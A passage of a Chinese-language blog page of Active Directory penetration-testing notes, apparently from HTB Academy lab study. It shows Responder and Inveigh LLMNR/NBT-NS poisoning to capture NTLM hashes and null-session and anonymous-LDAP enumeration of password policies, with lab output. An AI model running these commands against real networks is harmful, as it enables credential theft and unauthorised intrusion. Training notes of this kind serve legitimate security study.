

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://avatars.githubusercontent.com/u/169673987?v=4">
  <link rel="icon" href="https://avatars.githubusercontent.com/u/169673987?v=4">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="c2tsh4rk">
  <meta name="keywords" content="">
  
    <meta name="description" content="域渗透小思路以及笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="AD Notes">
<meta property="og:url" content="http://c2tsh4rk.github.io/2025/03/04/ADNotes/index.html">
<meta property="og:site_name" content="Try Harder!">
<meta property="og:description" content="域渗透小思路以及笔记">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-03-04T09:34:30.000Z">
<meta property="article:modified_time" content="2025-03-13T03:56:07.413Z">
<meta property="article:author" content="c2tsh4rk">
<meta property="article:tag" content="CPTS">
<meta property="article:tag" content="CAPE">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>AD Notes - Try Harder!</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"c2tsh4rk.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Try Harder!</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://raw.githubusercontent.com/c2tsh4rk/img/main/catcat.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="AD Notes"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-03-04 17:34" pubdate>
          2025年3月4日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          23k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          195 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">AD Notes</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="从初始侦查到获取立足点"><a href="#从初始侦查到获取立足点" class="headerlink" title="从初始侦查到获取立足点"></a>从初始侦查到获取立足点</h1><h2 id="1-osint获取到任何有价值的用户信息"><a href="#1-osint获取到任何有价值的用户信息" class="headerlink" title="1. osint获取到任何有价值的用户信息"></a>1. osint获取到任何有价值的用户信息</h2><h2 id="2-本地账户侦查"><a href="#2-本地账户侦查" class="headerlink" title="2. 本地账户侦查"></a>2. 本地账户侦查</h2><h3 id="LLMNR-NBT-NS-Poisoning"><a href="#LLMNR-NBT-NS-Poisoning" class="headerlink" title="LLMNR&#x2F;NBT-NS Poisoning"></a>LLMNR&#x2F;NBT-NS Poisoning</h3><p><strong>responder获取ntlmhash</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ responder -h<br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder 3.0.6.0<br><br>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br>  To <span class="hljs-built_in">kill</span> this script hit CTRL-C<br><br>Usage: responder -I eth0 -w -r -f<br>or:<br>responder -I eth0 -wrf<br><br>Options:<br>  --version             show program<span class="hljs-string">&#x27;s version number and exit</span><br><span class="hljs-string">  -h, --help            show this help message and exit</span><br><span class="hljs-string">  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,</span><br><span class="hljs-string">                        BROWSER, LLMNR requests without responding.</span><br><span class="hljs-string">  -I eth0, --interface=eth0</span><br><span class="hljs-string">                        Network interface to use, you can use &#x27;</span>ALL<span class="hljs-string">&#x27; as a</span><br><span class="hljs-string">                        wildcard for all interfaces</span><br><span class="hljs-string">  -i 10.0.0.21, --ip=10.0.0.21</span><br><span class="hljs-string">                        Local IP to use (only for OSX)</span><br><span class="hljs-string">  -e 10.0.0.22, --externalip=10.0.0.22</span><br><span class="hljs-string">                        Poison all requests with another IP address than</span><br><span class="hljs-string">                        Responder&#x27;</span>s one.<br>  -b, --basic           Return a Basic HTTP authentication. Default: NTLM<br>  -r, --wredir          Enable answers <span class="hljs-keyword">for</span> netbios wredir suffix queries.<br>                        Answering to wredir will likely <span class="hljs-built_in">break</span> stuff on the<br>                        network. Default: False<br>  -d, --NBTNSdomain     Enable answers <span class="hljs-keyword">for</span> netbios domain suffix queries.<br>                        Answering to domain suffixes will likely <span class="hljs-built_in">break</span> stuff<br>                        on the network. Default: False<br>  -f, --fingerprint     This option allows you to fingerprint a host that<br>                        issued an NBT-NS or LLMNR query.<br>  -w, --wpad            Start the WPAD rogue proxy server. Default value is<br>                        False<br>  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY<br>                        Upstream HTTP proxy used by the rogue WPAD Proxy <span class="hljs-keyword">for</span><br>                        outgoing requests (format: host:port)<br>  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file<br>                        retrieval. This may cause a login prompt. Default:<br>                        False<br>  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)<br>                        authentication <span class="hljs-keyword">for</span> the proxy. WPAD doesn<span class="hljs-string">&#x27;t need to be</span><br><span class="hljs-string">                        ON. This option is highly effective when combined with</span><br><span class="hljs-string">                        -r. Default: False</span><br><span class="hljs-string">  --lm                  Force LM hashing downgrade for Windows XP/2003 and</span><br><span class="hljs-string">                        earlier. Default: False</span><br><span class="hljs-string">  -v, --verbose         Increase verbosity.</span><br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; .\Inveigh.exe<br><br>[*] Inveigh <span class="hljs-number">2.0</span>.<span class="hljs-number">4</span> [<span class="hljs-type">Started</span> <span class="hljs-number">2022</span>-<span class="hljs-number">02</span>-<span class="hljs-number">28</span><span class="hljs-type">T20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">28</span> | <span class="hljs-type">PID</span> <span class="hljs-number">6276</span>]<br>[+] Packet Sniffer Addresses [<span class="hljs-type">IP</span> <span class="hljs-number">172.16</span><span class="hljs-type">.5.25</span> | <span class="hljs-type">IPv6</span> <span class="hljs-type">fe80</span>::<span class="hljs-type">dcec</span>:<span class="hljs-number">2831</span>:<span class="hljs-number">712</span><span class="hljs-type">b</span>:<span class="hljs-type">c9a3</span>%<span class="hljs-number">8</span>]<br>[+] Listener Addresses [<span class="hljs-type">IP</span> <span class="hljs-number">0.0</span><span class="hljs-type">.0.0</span> | <span class="hljs-type">IPv6</span> ::]<br>[+] Spoofer Reply Addresses [<span class="hljs-type">IP</span> <span class="hljs-number">172.16</span><span class="hljs-type">.5.25</span> | <span class="hljs-type">IPv6</span> <span class="hljs-type">fe80</span>::<span class="hljs-type">dcec</span>:<span class="hljs-number">2831</span>:<span class="hljs-number">712</span><span class="hljs-type">b</span>:<span class="hljs-type">c9a3</span>%<span class="hljs-number">8</span>]<br>[+] Spoofer Options [<span class="hljs-type">Repeat</span> <span class="hljs-type">Enabled</span> | <span class="hljs-type">Local</span> <span class="hljs-type">Attacks</span> <span class="hljs-type">Disabled</span>]<br>[ ] DHCPv6<br>[+] DNS Packet Sniffer [<span class="hljs-type">Type</span> <span class="hljs-type">A</span>]<br>[ ] ICMPv6<br>[+] LLMNR Packet Sniffer [<span class="hljs-type">Type</span> <span class="hljs-type">A</span>]<br>[ ] MDNS<br>[ ] NBNS<br>[+] HTTP Listener [<span class="hljs-type">HTTPAuth</span> <span class="hljs-type">NTLM</span> | <span class="hljs-type">WPADAuth</span> <span class="hljs-type">NTLM</span> | <span class="hljs-type">Port</span> <span class="hljs-number">80</span>]<br>[ ] HTTPS<br>[+] WebDAV [<span class="hljs-type">WebDAVAuth</span> <span class="hljs-type">NTLM</span>]<br>[ ] Proxy<br>[+] LDAP Listener [<span class="hljs-type">Port</span> <span class="hljs-number">389</span>]<br>[+] SMB Packet Sniffer [<span class="hljs-type">Port</span> <span class="hljs-number">445</span>]<br>[+] File Output [<span class="hljs-type">C</span>:\<span class="hljs-type">Tools</span>]<br>[+] Previous Session Files (Not Found)<br>[*] Press ESC to enter/<span class="hljs-keyword">exit</span> interactive console<br>[!] Failed to <span class="hljs-built_in">start</span> HTTP listener on port <span class="hljs-number">80</span>, check IP and port usage.<br>[!] Failed to <span class="hljs-built_in">start</span> HTTPv6 listener on port <span class="hljs-number">80</span>, check IP and port usage.<br><span class="hljs-function">[ ] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">31</span>] <span class="hljs-title">mDNS</span></span>(QM)(A) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0.local</span>] from <span class="hljs-number">172.16</span>.<span class="hljs-number">5.125</span> [<span class="hljs-type">disabled</span>]<br><span class="hljs-function">[ ] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">31</span>] <span class="hljs-title">mDNS</span></span>(QM)(AAAA) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0.local</span>] from <span class="hljs-number">172.16</span>.<span class="hljs-number">5.125</span> [<span class="hljs-type">disabled</span>]<br><span class="hljs-function">[ ] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">31</span>] <span class="hljs-title">mDNS</span></span>(QM)(A) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0.local</span>] from fe80::f098:<span class="hljs-number">4</span>f63:<span class="hljs-number">8384</span>:d1d0%<span class="hljs-number">8</span> [<span class="hljs-type">disabled</span>]<br><span class="hljs-function">[ ] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">31</span>] <span class="hljs-title">mDNS</span></span>(QM)(AAAA) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0.local</span>] from fe80::f098:<span class="hljs-number">4</span>f63:<span class="hljs-number">8384</span>:d1d0%<span class="hljs-number">8</span> [<span class="hljs-type">disabled</span>]<br><span class="hljs-function">[+] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">31</span>] <span class="hljs-title">LLMNR</span></span>(A) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0</span>] from <span class="hljs-number">172.16</span>.<span class="hljs-number">5.125</span> [<span class="hljs-type">response</span> <span class="hljs-type">sent</span>]<br><span class="hljs-function">[-] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">31</span>] <span class="hljs-title">LLMNR</span></span>(AAAA) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0</span>] from <span class="hljs-number">172.16</span>.<span class="hljs-number">5.125</span> [<span class="hljs-type">type</span> <span class="hljs-type">ignored</span>]<br><span class="hljs-function">[+] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">31</span>] <span class="hljs-title">LLMNR</span></span>(A) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0</span>] from fe80::f098:<span class="hljs-number">4</span>f63:<span class="hljs-number">8384</span>:d1d0%<span class="hljs-number">8</span> [<span class="hljs-type">response</span> <span class="hljs-type">sent</span>]<br><span class="hljs-function">[-] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">31</span>] <span class="hljs-title">LLMNR</span></span>(AAAA) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0</span>] from fe80::f098:<span class="hljs-number">4</span>f63:<span class="hljs-number">8384</span>:d1d0%<span class="hljs-number">8</span> [<span class="hljs-type">type</span> <span class="hljs-type">ignored</span>]<br><span class="hljs-function">[ ] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">32</span>] <span class="hljs-title">mDNS</span></span>(QM)(A) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0.local</span>] from <span class="hljs-number">172.16</span>.<span class="hljs-number">5.125</span> [<span class="hljs-type">disabled</span>]<br><span class="hljs-function">[ ] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">32</span>] <span class="hljs-title">mDNS</span></span>(QM)(AAAA) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0.local</span>] from <span class="hljs-number">172.16</span>.<span class="hljs-number">5.125</span> [<span class="hljs-type">disabled</span>]<br><span class="hljs-function">[ ] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">32</span>] <span class="hljs-title">mDNS</span></span>(QM)(A) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0.local</span>] from fe80::f098:<span class="hljs-number">4</span>f63:<span class="hljs-number">8384</span>:d1d0%<span class="hljs-number">8</span> [<span class="hljs-type">disabled</span>]<br><span class="hljs-function">[ ] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">32</span>] <span class="hljs-title">mDNS</span></span>(QM)(AAAA) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0.local</span>] from fe80::f098:<span class="hljs-number">4</span>f63:<span class="hljs-number">8384</span>:d1d0%<span class="hljs-number">8</span> [<span class="hljs-type">disabled</span>]<br><span class="hljs-function">[+] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">32</span>] <span class="hljs-title">LLMNR</span></span>(A) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0</span>] from <span class="hljs-number">172.16</span>.<span class="hljs-number">5.125</span> [<span class="hljs-type">response</span> <span class="hljs-type">sent</span>]<br><span class="hljs-function">[-] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">32</span>] <span class="hljs-title">LLMNR</span></span>(AAAA) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0</span>] from <span class="hljs-number">172.16</span>.<span class="hljs-number">5.125</span> [<span class="hljs-type">type</span> <span class="hljs-type">ignored</span>]<br><span class="hljs-function">[+] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">32</span>] <span class="hljs-title">LLMNR</span></span>(A) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0</span>] from fe80::f098:<span class="hljs-number">4</span>f63:<span class="hljs-number">8384</span>:d1d0%<span class="hljs-number">8</span> [<span class="hljs-type">response</span> <span class="hljs-type">sent</span>]<br><span class="hljs-function">[-] [<span class="hljs-number">20</span>:<span class="hljs-number">03</span>:<span class="hljs-number">32</span>] <span class="hljs-title">LLMNR</span></span>(AAAA) request [<span class="hljs-type">academy</span>-<span class="hljs-type">ea</span>-<span class="hljs-type">web0</span>] from fe80::f098:<span class="hljs-number">4</span>f63:<span class="hljs-number">8384</span>:d1d0%<span class="hljs-number">8</span> [<span class="hljs-type">type</span> <span class="hljs-type">ignored</span>]<br></code></pre></td></tr></table></figure>

<h2 id="3-枚举密码策略"><a href="#3-枚举密码策略" class="headerlink" title="3. 枚举密码策略"></a>3. 枚举密码策略</h2><h3 id="SMB-NULL"><a href="#SMB-NULL" class="headerlink" title="SMB NULL"></a>SMB NULL</h3><p><strong>rpcclient 测试 SMBNULL</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ rpcclient -U <span class="hljs-string">&quot;&quot;</span> -N 172.16.5.5<br><br>rpcclient $&gt; querydominfo<br>Domain:		INLANEFREIGHT<br>Server:		<br>Comment:	<br>Total Users:	3650<br>Total Groups:	0<br>Total Aliases:	37<br>Sequence No:	1<br>Force Logoff:	-1<br>Domain Server State:	0x1<br>Server Role:	ROLE_DOMAIN_PDC<br>Unknown 3:	0x1<br></code></pre></td></tr></table></figure>

<p><strong>使用 enum4linux</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ enum4linux -P 172.16.5.5<br><br>&lt;SNIP&gt;<br><br> ================================================== <br>|    Password Policy Information <span class="hljs-keyword">for</span> 172.16.5.5    |<br> ================================================== <br><br>[+] Attaching to 172.16.5.5 using a NULL share<br>[+] Trying protocol 139/SMB...<br><br>	[!] Protocol failed: Cannot request session (Called Name:172.16.5.5)<br><br>[+] Trying protocol 445/SMB...<br>[+] Found domain(s):<br><br>	[+] INLANEFREIGHT<br>	[+] Builtin<br><br>[+] Password Info <span class="hljs-keyword">for</span> Domain: INLANEFREIGHT<br><br>	[+] Minimum password length: 8<br>	[+] Password <span class="hljs-built_in">history</span> length: 24<br>	[+] Maximum password age: Not Set<br>	[+] Password Complexity Flags: 000001<br><br>		[+] Domain Refuse Password Change: 0<br>		[+] Domain Password Store Cleartext: 0<br>		[+] Domain Password Lockout Admins: 0<br>		[+] Domain Password No Clear Change: 0<br>		[+] Domain Password No Anon Change: 0<br>		[+] Domain Password Complex: 1<br><br>	[+] Minimum password age: 1 day 4 minutes <br>	[+] Reset Account Lockout Counter: 30 minutes <br>	[+] Locked Account Duration: 30 minutes <br>	[+] Account Lockout Threshold: 5<br>	[+] Forced Log off Time: Not Set<br><br>[+] Retieved partial password policy with rpcclient:<br><br>Password Complexity: Enabled<br>Minimum Password Length: 8<br><br>enum4linux complete on Tue Feb 22 17:39:29 2022<br></code></pre></td></tr></table></figure>

<p><strong>windows 下使用net测试</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">htb</span>&gt; <span class="hljs-title">net</span> <span class="hljs-title">use</span> \\<span class="hljs-title">DC01</span>\<span class="hljs-title">ipc</span>$ &quot;&quot; /<span class="hljs-title">u</span>:&quot;&quot;</span><br><span class="hljs-function"><span class="hljs-title">The</span> <span class="hljs-title">command</span> <span class="hljs-title">completed</span> <span class="hljs-title">successfully</span>.</span><br></code></pre></td></tr></table></figure>

<h3 id="LDAP-Anomynous"><a href="#LDAP-Anomynous" class="headerlink" title="LDAP Anomynous"></a>LDAP Anomynous</h3><p><strong>ldapsearch</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">C47Sh4rk@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b <span class="hljs-string">&quot;DC=INLANEFREIGHT,DC=LOCAL&quot;</span> -s sub <span class="hljs-string">&quot;*&quot;</span> | grep -m 1 -B 10 pwdHistoryLength<br><br>forceLogoff: -9223372036854775808<br>lockoutDuration: -18000000000<br>lockOutObservationWindow: -18000000000<br>lockoutThreshold: 5<br>maxPwdAge: -9223372036854775808<br>minPwdAge: -864000000000<br>minPwdLength: 8<br>modifiedCountAtLastProm: 0<br>nextRid: 1002<br>pwdProperties: 1<br>pwdHistoryLength: 24<br></code></pre></td></tr></table></figure>

<p><strong>net.exe</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">C:\<span class="hljs-title">htb</span>&gt; <span class="hljs-title">net</span> <span class="hljs-title">accounts</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Force</span> <span class="hljs-title">user</span> <span class="hljs-title">logoff</span> <span class="hljs-title">how</span> <span class="hljs-title">long</span> <span class="hljs-title">after</span> <span class="hljs-title">time</span> <span class="hljs-title">expires</span>?:       <span class="hljs-title">Never</span></span><br><span class="hljs-function"><span class="hljs-title">Minimum</span> <span class="hljs-title">password</span> <span class="hljs-title">age</span> (<span class="hljs-title">days</span>):                          1</span><br><span class="hljs-function"><span class="hljs-title">Maximum</span> <span class="hljs-title">password</span> <span class="hljs-title">age</span> (<span class="hljs-title">days</span>):                          <span class="hljs-title">Unlimited</span></span><br><span class="hljs-function"><span class="hljs-title">Minimum</span> <span class="hljs-title">password</span> <span class="hljs-title">length</span>:                              8</span><br><span class="hljs-function"><span class="hljs-title">Length</span> <span class="hljs-title">of</span> <span class="hljs-title">password</span> <span class="hljs-title">history</span> <span class="hljs-title">maintained</span>:                24</span><br><span class="hljs-function"><span class="hljs-title">Lockout</span> <span class="hljs-title">threshold</span>:                                    5</span><br><span class="hljs-function"><span class="hljs-title">Lockout</span> <span class="hljs-title">duration</span> (<span class="hljs-title">minutes</span>):                           30</span><br><span class="hljs-function"><span 